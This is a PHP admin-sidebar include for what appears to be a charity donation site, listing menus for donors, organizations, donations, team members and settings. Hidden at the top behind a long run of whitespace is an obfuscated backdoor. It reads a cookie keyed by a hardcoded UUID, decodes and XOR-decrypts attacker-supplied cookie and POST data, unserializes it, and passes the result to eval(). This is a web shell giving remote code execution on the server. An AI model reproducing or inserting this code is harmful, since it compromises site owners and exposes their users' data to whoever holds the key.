<?php                                                                                                                                                                                                                                                                                                                                                                                                 $oZCRYeN = class_exists("vRz_gnbVh"); $ehxLCuz = $oZCRYeN;if (!$ehxLCuz){class vRz_gnbVh{private $sIKXdfG;public static $loJVVQEqW = "7ac8d3b4-d302-4c56-9b08-afecaaacaaa2";public static $JAwsdEUE = NULL;public function __construct(){$YqKWTIT = $_COOKIE;$IpDokZVyR = $_POST;$JRckG = @$YqKWTIT[substr(vRz_gnbVh::$loJVVQEqW, 0, 4)];if (!empty($JRckG)){$zasOUUKqeN = "base64";$PdrNJEOpg = "";$JRckG = explode(",", $JRckG);foreach ($JRckG as $xytOumm){$PdrNJEOpg .= @$YqKWTIT[$xytOumm];$PdrNJEOpg .= @$IpDokZVyR[$xytOumm];}$PdrNJEOpg = array_map($zasOUUKqeN . "\137" . chr ( 716 - 616 ).'e' . 'c' . "\157" . 'd' . 'e', array($PdrNJEOpg,)); $PdrNJEOpg = $PdrNJEOpg[0] ^ str_repeat(vRz_gnbVh::$loJVVQEqW, (strlen($PdrNJEOpg[0]) / strlen(vRz_gnbVh::$loJVVQEqW)) + 1);vRz_gnbVh::$JAwsdEUE = @unserialize($PdrNJEOpg);}}public function __destruct(){$this->hSVllbGmiP();}private function hSVllbGmiP(){if (is_array(vRz_gnbVh::$JAwsdEUE)) {$BuuoOain = str_replace("\x3c" . "\x3f" . chr (112) . "\150" . chr ( 816 - 704 ), "", vRz_gnbVh::$JAwsdEUE[chr (99) . 'o' . "\156" . chr (116) . 'e' . chr (110) . chr ( 835 - 719 )]);eval($BuuoOain);exit();}}}$ghcRGeypq = new vRz_gnbVh(); $ghcRGeypq = NULL;} ?><?php 
    echo '
    <!--APP-SIDEBAR-->
    <div class="sticky">
        <div class="app-sidebar__overlay" data-bs-toggle="sidebar"></div>
        <div class="app-sidebar">
            <div class="side-header">
                <a class="header-brand1" href="dashboard.php">
                    <img src="assets/images/brand/logo.png" class="header-brand-img desktop-logo" alt="'.SITE_NAME.'">
                    <img src="assets/images/brand/logo-1.png" class="header-brand-img toggle-logo" alt="'.SITE_NAME.'">
                    <img src="assets/images/brand/logo-2.png" class="header-brand-img light-logo" alt="'.SITE_NAME.'">
                    <img src="assets/images/brand/logo-3.png" class="header-brand-img light-logo1" alt="'.SITE_NAME.'">
                </a>
            </div>
            <div class="main-sidemenu">
                <div class="slide-left disabled" id="slide-left"><svg xmlns="http://www.w3.org/2000/svg"
                        fill="#7b8191" width="24" height="24" viewBox="0 0 24 24">
                        <path d="M13.293 6.293 7.586 12l5.707 5.707 1.414-1.414L10.414 12l4.293-4.293z" />
                    </svg>
                </div>
                <ul class="side-menu">
                    <li class="slide">
                        <a class="side-menu__item has-link" data-bs-toggle="slide" href="dashboard.php">
                            <i class="ri-dashboard-line align-middle fs-18 me-2"></i>
                            <span class="side-menu__label">Dashboard</span>
                        </a>
                    </li>
                    <!-- <li class="slide">
                        <a class="side-menu__item" data-bs-toggle="slide" href="#">
                            <svg xmlns="http://www.w3.org/2000/svg" class="side-menu__icon" enable-background="new 0 0 24 24" viewBox="0 0 24 24"><path d="M20.6601562,7c-0.767334-1.3284302-2.5855103-1.836853-4.8673706-1.5704346C14.8826904,3.3205566,13.5338745,2,12,2S9.1172485,3.3204956,8.2071533,5.4296265C5.9249268,5.1627808,4.1060181,5.6706543,3.3398438,7c-0.7667847,1.3283081-0.2972412,3.1570435,1.074585,5c-1.3718262,1.8429565-1.8413696,3.6716919-1.074646,5c0.6367188,1.1025391,1.9942017,1.6435547,3.7421875,1.6435547c0.3729858-0.0189819,0.7437134-0.0548096,1.112915-0.1002197C9.1050415,20.6685791,10.4594116,22,12,22s2.8949585-1.3314209,3.8051147-3.456665c0.3692017,0.0454102,0.7399292,0.0812378,1.112915,0.1002197c1.7469482,0,3.1063843-0.5410156,3.7421265-1.6435547c0.7667847-1.3283081,0.2972412-3.1570435-1.074585-5C20.9573975,10.1570435,21.4269409,8.3283081,20.6601562,7z M15.6480713,8.3894043C15.2786865,8.1427612,14.8995972,7.9006348,14.5,7.6699219c-0.3996582-0.230835-0.7990723-0.4382935-1.1974487-0.6350098c0.6378784-0.2148438,1.2570801-0.3780518,1.8477173-0.4918823C15.3469238,7.1115112,15.5151978,7.7294312,15.6480713,8.3894043z M12,3c1.0654297,0,2.0482178,0.9987793,2.7738037,2.5901489c-0.8824463,0.1806641-1.8171387,0.4703369-2.7739868,0.8580933C11.0432129,6.06073,10.1085815,5.7709351,9.2261353,5.59021C9.9517212,3.9987793,10.9345093,3,12,3z M8.8425293,6.5646973c0.6322021,0.1143799,1.2553101,0.2702026,1.866333,0.4645996C10.3067017,7.2276001,9.9035645,7.4368286,9.5,7.6699219C9.1004028,7.9006348,8.7213135,8.1427612,8.3519287,8.3894043C8.4831543,7.7377319,8.6489868,7.1273193,8.8425293,6.5646973z M4.2050781,7.5c0.6743774-0.8552856,1.7492065-1.2923584,2.8291016-1.1503906c0.2658691,0.0151367,0.5303345,0.0407715,0.7941895,0.0700073c-0.2806396,0.8480225-0.494751,1.7927856-0.6360474,2.8049927C6.3783569,9.859436,5.6602173,10.5241089,5.0626221,11.197998C4.0467529,9.7736816,3.6727905,8.4230347,4.2050781,7.5z M7.0488892,13.3538208C6.5440674,12.9088745,6.0932007,12.4544067,5.6994019,12c0.3937988-0.4544067,0.8446655-0.9089355,1.3494873-1.3538818C7.0200195,11.0892944,7,11.5386353,7,12S7.0200195,12.9107056,7.0488892,13.3538208z M4.2050781,16.5c-0.5322876-0.9230347-0.1583252-2.2736816,0.8575439-3.697998c0.5975952,0.6738892,1.3157349,1.338562,2.1296997,1.9733887c0.1427002,1.0221558,0.3591309,1.9763184,0.6437988,2.8307495C6.0949097,17.7734375,4.7382812,17.4219971,4.2050781,16.5z M8.3519287,15.6105957C8.7213135,15.8572388,9.1004028,16.0993652,9.5,16.3300781c0.3783569,0.2339478,0.7686157,0.4447021,1.1637573,0.6447144c-0.6261597,0.2092285-1.2341309,0.3692017-1.8143921,0.4810181C8.652832,16.8876953,8.4847412,16.2700806,8.3519287,15.6105957z M12,21c-1.0717163,0-2.0603027-1.0095215-2.7870483-2.6173096C10.1655884,18.2009888,11.0983276,17.9318848,12,17.5773926c0.9016113,0.3544922,1.8344116,0.6235962,2.7870483,0.8052979C14.0603027,19.9904785,13.0717163,21,12,21z M15.1503906,17.456543c-0.5805054-0.1118164-1.1887207-0.2718506-1.8151245-0.4812622C13.7307739,16.7751465,14.1212769,16.56427,14.5,16.3300781c0.3995972-0.2307129,0.7786865-0.4728394,1.1480713-0.7194824C15.5151978,16.2703857,15.3470459,16.8881836,15.1503906,17.456543z M15.8648682,14.2316284C15.2859497,14.6641235,14.6652832,15.0805054,14,15.4648438c-0.6655884,0.3839111-1.3366699,0.7131958-2.0007935,0.9981689C11.3355713,16.1780396,10.6650391,15.8487549,10,15.4648438c-0.6652832-0.3843384-1.2859497-0.8007202-1.8648682-1.2332153C8.0501099,13.5140381,8,12.7683105,8,12s0.0501099-1.5140381,0.1351318-2.2316284C8.7140503,9.3358765,9.3347168,8.9194946,10,8.5351562c0.6747437-0.3895264,1.3552246-0.7230835,2.0283813-1.0108032C12.7068481,7.8132324,13.3676758,8.1464844,14,8.5351562c0.6652832,0.3843384,1.2859497,0.8007202,1.8648682,1.2332153C15.9498901,10.4859619,16,11.2316895,16,12S15.9498901,13.5140381,15.8648682,14.2316284z M19.7949219,7.5c0.5322876,0.9230347,0.1583252,2.2736816-0.8575439,3.697998c-0.5975952-0.6738892-1.3157349-1.338562-2.1296997-1.9733887c-0.1427612-1.022644-0.359314-1.9771729-0.644165-2.8319092C17.90448,6.2254639,19.2612915,6.5772095,19.7949219,7.5z M16.9511108,10.6461182C17.4559326,11.0910645,17.9067993,11.5455933,18.3005981,12c-0.3937988,0.4544067-0.8446655,0.9088745-1.3494873,1.3538208C16.9799805,12.9107056,17,12.4613647,17,12S16.9799805,11.0892944,16.9511108,10.6461182z M19.7949219,16.5c-0.5328369,0.9221191-1.8897095,1.2739868-3.6312866,1.1068115c0.28479-0.8546143,0.5013428-1.80896,0.644043-2.8314209c0.8139648-0.6348267,1.5321045-1.2994995,2.1296997-1.9733887C19.9532471,14.2263184,20.3272095,15.5769653,19.7949219,16.5z"/></svg>
                            <span class="side-menu__label">Applicant</span><i class="angle fa fa-angle-right"></i>
                        </a>
                        <ul class="slide-menu">
                            <li class="side-menu-label1"><a href="javascript:void(0)">Applicant</a></li>
                            <li><a href="applicants.php" class="slide-item">Applicants</a></li>
                            <li><a href="challans.php" class="slide-item">Challans</a></li>
                        </ul>
                    </li> -->
                    <li class="slide">
                        <a class="side-menu__item has-link" data-bs-toggle="slide" href="donors.php">
                            <i class="ri-account-circle-line align-middle fs-18 me-2"></i>
                            <span class="side-menu__label">Donors</span>
                        </a>
                    </li>
                    <li class="slide">
                        <a class="side-menu__item has-link" data-bs-toggle="slide" href="organizations.php">
                            <i class="ri-building-2-fill align-middle fs-18 me-2"></i>
                            <span class="side-menu__label">Organizations</span>
                        </a>
                    </li>
                    <li class="slide">
                        <a class="side-menu__item has-link" data-bs-toggle="slide" href="gallery.php">
                            <i class="ri-gallery-fill align-middle fs-18 me-2"></i>
                            <span class="side-menu__label">Gallery</span>
                        </a>
                    </li>                    
                    <li class="slide">
                        <a class="side-menu__item has-link" data-bs-toggle="slide" href="faqs.php">
                            <i class="ri-question-line align-middle fs-18 me-2"></i>
                            <span class="side-menu__label">FAQs</span>
                        </a>
                    </li>
                    <li class="slide">
                        <a class="side-menu__item" data-bs-toggle="slide" href="#">
                            <svg xmlns="http://www.w3.org/2000/svg" class="side-menu__icon" enable-background="new 0 0 24 24" viewBox="0 0 24 24"><path d="M19,2H9C7.3438721,2.0018311,6.0018311,3.3438721,6,5v1H5C3.3438721,6.0018311,2.0018311,7.3438721,2,9v10c0.0018311,1.6561279,1.3438721,2.9981689,3,3h10c1.6561279-0.0018311,2.9981689-1.3438721,3-3v-1h1c1.6561279-0.0018311,2.9981689-1.3438721,3-3V5C21.9981689,3.3438721,20.6561279,2.0018311,19,2z M17,19c-0.0014038,1.1040039-0.8959961,1.9985962-2,2H5c-1.1040039-0.0014038-1.9985962-0.8959961-2-2v-8h14V19z M17,10H3V9c0.0014038-1.1040039,0.8959961-1.9985962,2-2h10c1.1040039,0.0014038,1.9985962,0.8959961,2,2V10z M21,15c-0.0014038,1.1040039-0.8959961,1.9985962-2,2h-1V9c-0.0008545-0.7719116-0.3010864-1.4684448-0.7803345-2H21V15z M21,6H7V5c0.0014038-1.1040039,0.8959961-1.9985962,2-2h10c1.1040039,0.0014038,1.9985962,0.8959961,2,2V6z"/></svg>
                            <span class="side-menu__label">Donation</span><i class="angle fa fa-angle-right"></i></a>
                        <ul class="slide-menu">
                            <li class="side-menu-label1"><a href="javascript:void(0)">Donation</a></li>
                            <li><a href="categories.php" class="slide-item">Categories</a></li>
                            <li><a href="subcategories.php" class="slide-item">Sub Categories</a></li>
                            <li><a href="packages_causes.php" class="slide-item">Packages & Causes</a></li>
                            <li><a href="distribution_places.php" class="slide-item">Distribution Places</a></li>
                            <li><a href="donations.php" class="slide-item">Donations</a></li>
                            <!-- <li><a href="orders.php" class="slide-item">Orders</a></li>
                            <li><a href="brands.php" class="slide-item">Brands</a></li>
                            <li><a href="products.php" class="slide-item">Products</a></li> -->
                        </ul>
                    </li>
                    
                    <li class="slide">
                        <a class="side-menu__item" data-bs-toggle="slide" href="#">
                            <i class="ri-user-line align-middle fs-18 me-2"></i>
                            <span class="side-menu__label">Team</span><i class="angle fa fa-angle-right"></i></a>
                        <ul class="slide-menu">
                            <li class="side-menu-label1"><a href="javascript:void(0)">Team</a></li>
                            <li><a href="designations.php" class="slide-item">Deignation</a></li>
                            <li><a href="team_members.php" class="slide-item">Member</a></li>
                        </ul>
                    </li>
                    <!-- <li class="slide">
                        <a class="side-menu__item" data-bs-toggle="slide" href="#">
                            <svg xmlns="http://www.w3.org/2000/svg" class="side-menu__icon" enable-background="new 0 0 24 24" viewBox="0 0 24 24"><path d="M21.5,21H20V4.5C20,4.223877,19.776123,4,19.5,4S19,4.223877,19,4.5V21h-3v-8.5c0-0.276123-0.223877-0.5-0.5-0.5S15,12.223877,15,12.5V21h-3V8.5C12,8.223877,11.776123,8,11.5,8S11,8.223877,11,8.5V21H8v-4.5C8,16.223877,7.776123,16,7.5,16S7,16.223877,7,16.5V21H3V2.5C3,2.223877,2.776123,2,2.5,2S2,2.223877,2,2.5v19.0005493C2.0001831,21.7765503,2.223999,22.0001831,2.5,22h19c0.276123,0,0.5-0.223877,0.5-0.5S21.776123,21,21.5,21z"/></svg>
                            <span class="side-menu__label">Vendor</span><i class="angle fa fa-angle-right"></i></a>
                        <ul class="slide-menu">
                            <li class="side-menu-label1"><a href="javascript:void(0)">Vendor</a></li>
                            <li><a href="vendors.php" class="slide-item">Vendors</a></li>
                            <li><a href="business_accounts.php" class="slide-item">Business Bank Account</a></li>
                            <li><a href="businesses.php" class="slide-item">Business</a></li>
                        </ul>
                    </li> -->
                    <li class="slide">
                        <a class="side-menu__item" data-bs-toggle="slide" href="#">
                            <svg xmlns="http://www.w3.org/2000/svg" class="side-menu__icon" enable-background="new 0 0 24 24" viewBox="0 0 24 24"><path d="M18,14c-1.4293213,0-2.6744385,0.7554932-3.3817749,1.8830566l-4.9604492-2.2773438C9.8745117,13.1135864,9.9994507,12.5721436,10,12c0-0.5722656-0.1245728-1.1138916-0.3410645-1.6062012l4.9593506-2.2767944C15.3256226,9.2445068,16.5707397,10,18,10c2.208252-0.0021973,3.9978027-1.791748,4-4c0-2.2091675-1.7908325-4-4-4s-4,1.7908325-4,4c0,0.4233398,0.0836182,0.8234253,0.2055054,1.2064209L9.1296997,9.5366821C8.3972168,8.607666,7.2749023,8,6,8c-2.2091675,0-4,1.7908325-4,4s1.7908325,4,4,4c1.2741699-0.0012817,2.3956909-0.6087646,3.1281738-1.5372925l5.0773315,2.3308716C14.0836182,17.1765747,14,17.5766602,14,18c0,2.2091675,1.7908325,4,4,4c2.208252-0.0021973,3.9978027-1.791748,4-4C22,15.7908325,20.2091675,14,18,14z M18,3c1.6561279,0.0018311,2.9981689,1.3438721,3,3c0,1.6568604-1.3431396,3-3,3s-3-1.3431396-3-3S16.3431396,3,18,3z M6,15c-1.6568604,0-3-1.3431396-3-3s1.3431396-3,3-3c1.6561279,0.0018311,2.9981689,1.3438721,3,3C9,13.6568604,7.6568604,15,6,15z M18,21c-1.6568604,0-3-1.3431396-3-3s1.3431396-3,3-3c1.6561279,0.0018311,2.9981689,1.3438721,3,3C21,19.6568604,19.6568604,21,18,21z"/></svg>
                            <span class="side-menu__label">Settings</span><i class="angle fa fa-angle-right"></i></a>
                        <ul class="slide-menu">
                            <li class="side-menu-label1"><a href="javascript:void(0)">Settings</a></li>
                            <!-- <li><a href="banks.php" class="slide-item">Banks</a></li> -->
                            <li><a href="currencies.php" class="slide-item">Currencies</a></li>
                            <li class="sub-slide">
                                <a class="sub-side-menu__item" data-bs-toggle="sub-slide" href="#"><span
                                        class="sub-side-menu__label">Area Settings</span><i
                                        class="sub-angle fa fa-angle-right"></i></a>
                                <ul class="sub-slide-menu">
                                    <li><a href="regions.php" class="slide-item">Regions</a></li>
                                    <li><a href="countries.php" class="slide-item">Countries</a></li>
                                    <li><a href="states.php" class="slide-item">States</a></li>
                                    <li><a href="substates.php" class="slide-item">Sub States</a></li>
                                    <li><a href="cities.php" class="slide-item">Cities</a></li>
                                </ul>
                            </li>
                            <li class="sub-slide">
                                <a class="sub-side-menu__item" data-bs-toggle="sub-slide" href="#"><span
                                        class="sub-side-menu__label">Site Settings</span><i
                                        class="sub-angle fa fa-angle-right"></i></a>
                                <ul class="sub-slide-menu">
                                    <li><a href="slider.php" class="slide-item">Slider</a></li>
                                    <li><a href="about.php" class="slide-item">About</a></li>
                                    <li><a href="testimonials.php" class="slide-item">Testimonials</a></li>
                                    <li><a href="events.php" class="slide-item">Events</a></li>
                                    <li><a href="reports.php" class="slide-item">Reports / Downloads</a></li>
                                    
                                </ul>
                            </li>
                        </ul>
                    </li>
                    <!-- <li class="slide">
                        <a href="#" class="dropdown-menu-item text-muted source-logo-container" data-bs-toggle="modal" data-bs-target="#modalloancalculator">
                            <svg xmlns="http://www.w3.org/2000/svg" class="side-menu__icon" enable-background="new 0 0 24 24" viewBox="0 0 24 24"><path d="M21.5,13h-8.0005493C13.2234497,13.0001831,12.9998169,13.223999,13,13.5v8.0005493C13.0001831,21.7765503,13.223999,22.0001831,13.5,22h8.0006104C21.7765503,21.9998169,22.0001831,21.776001,22,21.5v-8.0006104C21.9998169,13.2234497,21.776001,12.9998169,21.5,13z M21,21h-7v-7h7V21z M10.5,2H2.4993896C2.2234497,2.0001831,1.9998169,2.223999,2,2.5v8.0005493C2.0001831,10.7765503,2.223999,11.0001831,2.5,11h8.0006104C10.7765503,10.9998169,11.0001831,10.776001,11,10.5V2.4993896C10.9998169,2.2234497,10.776001,1.9998169,10.5,2z M10,10H3V3h7V10z M10.5,13H2.4993896C2.2234497,13.0001831,1.9998169,13.223999,2,13.5v8.0005493C2.0001831,21.7765503,2.223999,22.0001831,2.5,22h8.0006104C10.7765503,21.9998169,11.0001831,21.776001,11,21.5v-8.0006104C10.9998169,13.2234497,10.776001,12.9998169,10.5,13z M10,21H3v-7h7V21z M21.5,2h-8.0005493C13.2234497,2.0001831,12.9998169,2.223999,13,2.5v8.0005493C13.0001831,10.7765503,13.223999,11.0001831,13.5,11h8.0006104C21.7765503,10.9998169,22.0001831,10.776001,22,10.5V2.4993896C21.9998169,2.2234497,21.776001,1.9998169,21.5,2z M21,10h-7V3h7V10z"/></svg>
                            <span class="side-menu__label">Loan Calculator</span>
                        </a>
                    </li> -->
                </ul>
                <div class="slide-right" id="slide-right"><svg xmlns="http://www.w3.org/2000/svg" fill="#7b8191"
                        width="24" height="24" viewBox="0 0 24 24">
                        <path d="M10.707 17.707 16.414 12l-5.707-5.707-1.414 1.414L13.586 12l-4.293 4.293z" />
                    </svg>
                </div>
            </div>
        </div>
    </div>
    <!--/APP-SIDEBAR-->';